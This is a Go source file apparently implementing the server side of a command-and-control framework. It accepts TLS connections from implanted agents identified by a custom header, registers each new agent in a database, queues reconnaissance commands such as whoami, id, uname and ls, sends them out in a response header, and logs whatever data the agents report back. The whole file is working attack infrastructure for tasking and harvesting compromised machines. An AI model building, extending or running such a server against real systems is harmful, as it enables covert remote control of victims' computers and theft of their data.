package server

import (
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/google/uuid"
)

type Server struct {
	DomainName  string
	ListenAddr  string
	CACertFile  string
	CertFile    string
	PrivKeyFile string
	KeyPassFile string
	IDHeader    string
	CmdHeader   string
	DataHeader  string
}

const logFilePath = "./logs/goc2server.log"

func (s *Server) Listen() {
	logFile, _ := s.setFileLogger(logFilePath)
	defer logFile.Close()

	mux := s.getServeMux()

	srv := &http.Server{
		Addr:      s.ListenAddr,
		Handler:   mux,
		TLSConfig: s.getTLSConfig(),
	}

	log.Printf("starting the server on %s", s.ListenAddr)

	if err := srv.ListenAndServeTLS("", ""); err != nil {
		log.Fatalf("error listening on port: %v", err)
	}
}

func (s *Server) getServeMux() (mux *http.ServeMux) {
	mux = http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, req *http.Request) {
		db := getDB()
		defer db.Close()

		logStr := fmt.Sprintf("IP: %s | Path: %s", req.RemoteAddr, req.URL.Path)

		agentID := req.Header.Get(s.IDHeader)
		agentData := req.Header.Get(s.DataHeader)

		if agentID != "" {
			logStr += fmt.Sprintf(" | ClientID: %s", agentID)

			if !agentExists(db, agentID) {
				createAgent(db, DBAgent{
					id:        agentID,
					createdAt: "now",
					updatedAt: "none",
				})
			}

			cmd, err := getAgentCmd(db, agentID)
			if err == nil {
				w.Header().Set(s.CmdHeader, cmd.command)
				log.Printf("%s header set with value %s", s.CmdHeader, cmd)
			} else {
				fmt.Printf("adding a few cmds for agent %s", agentID)
				for _, c := range []string{"whoami", "id", "uname", "ls"} {
					createAgentCmd(db, DBCommand{id: uuid.NewString(), agentID: agentID, command: c, result: "", createdAt: fmt.Sprint(time.Now().Unix()), updatedAt: ""})
				}
			}
		}

		if agentData != "" {
			updateAgentCmd(db, DBCommand{agentID: agentID, command: agentData, result: agentData, updatedAt: "now123"})
			logStr += fmt.Sprintf(" | Data: %s", agentData)
		}
		log.Print(logStr)
		fmt.Fprint(w, "")
	})
	return
}
